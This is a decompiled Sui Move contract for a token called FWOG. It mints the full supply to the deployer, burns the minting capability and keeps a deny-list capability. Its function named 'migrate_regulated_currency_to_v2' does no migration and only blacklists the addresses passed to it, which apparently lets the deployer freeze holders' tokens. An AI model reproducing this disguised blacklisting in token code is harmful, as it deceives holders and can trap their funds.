module 0x1b5a824173cde6fd31611e39a8bf6f1f7d5639c4287ec9d22dbb0dd016b6fbbd::FWOG {
    struct FWOG has drop {
        dummy_field: bool,
    }

    fun init(arg0: FWOG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<FWOG>(arg0, 2, b"FWOG", b"FWOG", b"FWOG", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/v4deW3b6Fz7rBpKDZq3Ai_xPxSSHsic_EoWwFW66YVY?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FWOG>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<FWOG>>(v1, 0x2::tx_context::sender(arg1));
        let v3 = v0;
        0x2::coin::mint_and_transfer<FWOG>(&mut v3, 100000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<FWOG>>(v3, @0x0);
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<FWOG>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<FWOG>(arg0, v1)) {
                0x2::coin::deny_list_add<FWOG>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

